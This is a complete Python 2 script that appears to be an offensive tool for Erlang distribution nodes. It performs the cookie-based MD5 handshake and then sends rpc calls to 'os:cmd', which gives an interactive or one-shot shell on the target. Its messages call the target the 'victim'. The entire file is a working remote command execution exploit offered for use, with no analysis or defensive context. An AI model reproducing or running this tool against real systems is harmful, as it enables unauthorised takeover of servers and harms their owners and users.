#!/usr/bin/env python2

from struct import pack, unpack
from cStringIO import StringIO
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from hashlib import md5
from binascii import hexlify, unhexlify
from random import choice
from string import ascii_uppercase
import sys
import argparse
import erlang as erl

def rand_id(n=6):
  return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'

parser = argparse.ArgumentParser(description='Execute shell command through Erlang distribution protocol')

parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
parser.add_argument('--verbose', action='store_true', help='Output decode Erlang binary term format received')
parser.add_argument('--challenge', type=int, default=0, help='Set client challenge value')
parser.add_argument('cmd', default=None, nargs='?', action='store', type=str, help='Shell command to execute, defaults to interactive shell')

args = parser.parse_args()

name = rand_id()

sock = socket(AF_INET, SOCK_STREAM, 0)
assert(sock)

sock.connect((args.target, args.port))

def send_name(name):
  return pack('!HcHI', 7 + len(name), 'n', 5, 0x7499c) + name

sock.sendall(send_name(name))

data = sock.recv(5)
assert(data == '\x00\x03\x73\x6f\x6b')

data = sock.recv(4096)
(length, tag, version, flags, challenge) = unpack('!HcHII', data[:13])
challenge = '%u' % challenge

def send_challenge_reply(cookie, challenge):
  m = md5()
  m.update(cookie)
  m.update(challenge)
  response = m.digest()
  return pack('!HcI', len(response)+5, 'r', args.challenge) + response

sock.sendall(send_challenge_reply(args.cookie, challenge))


data = sock.recv(3)
if len(data) == 0:
  print('wrong cookie, auth unsuccessful')
  sys.exit(1)
else:
  assert(data == '\x00\x11\x61')
  digest = sock.recv(16)
  assert(len(digest) == 16)


print('[*] authenticated onto victim')



# Once connected, protocol between us and victim is described
# at http://erlang.org/doc/apps/erts/erl_dist_protocol.html#protocol-between-connected-nodes
# it is roughly a variant of erlang binary term format
# the format also depends on the version of ERTS post (incl.) or pre 5.7.2
# the format used here is based on pre 5.7.2, the old one

def erl_dist_recv(f):
  hdr = f.recv(4)
  if len(hdr) != 4: return
  (length,) = unpack('!I', hdr)
  data = f.recv(length)
  if len(data) != length: return

  # remove 0x70 from head of stream
  data = data[1:]

  while data:
    (parsed, term) = erl.binary_to_term(data)
    if parsed <= 0:
      print('failed to parse erlang term, may need to peek into it')
      break

    yield term

    data = data[parsed:]


def encode_string(name, type=0x64):
  return pack('!BH', type, len(name)) + name

def send_cmd_old(name, cmd):
  data = (unhexlify('70836804610667') + 
    encode_string(name) + 
    unhexlify('0000000300000000006400006400037265') +
    unhexlify('7883680267') + 
    encode_string(name) + 
    unhexlify('0000000300000000006805') +
    encode_string('call') +
    encode_string('os') +
    encode_string('cmd') +
    unhexlify('6c00000001') + 
    encode_string(cmd, 0x6b) + 
    unhexlify('6a') + 
    encode_string('user'))

  return pack('!I', len(data)) + data



def send_cmd(name, cmd):
  # REG_SEND control message
  ctrl_msg = (6,
    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
    erl.OtpErlangAtom(''),
    erl.OtpErlangAtom('rex'))
  msg = (
    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
    (
      erl.OtpErlangAtom('call'),
      erl.OtpErlangAtom('os'),
      erl.OtpErlangAtom('cmd'),
      [cmd],
      erl.OtpErlangAtom('user')
    ))

  new_data = '\x70' + erl.term_to_binary(ctrl_msg) + erl.term_to_binary(msg)

  return pack('!I', len(new_data)) + new_data

def recv_reply(f):
  terms = [t for t in erl_dist_recv(f)]
  if args.verbose:
    print('\nreceived %r' % (terms))

  assert(len(terms) == 2)
  answer = terms[1]
  assert(len(answer) == 2)
  return answer[1]


if not args.cmd:
  while True:
    try:
      cmd = raw_input('%s:%d $ ' % (args.target, args.port))
    except EOFError:
      print('')
      break

    sock.sendall(send_cmd(name, cmd))

    reply = recv_reply(sock)
    sys.stdout.write(reply)
else:
  sock.sendall(send_cmd(name, args.cmd))

  reply = recv_reply(sock)
  sys.stdout.write(reply)


print('[*] disconnecting from victim')
sock.close()
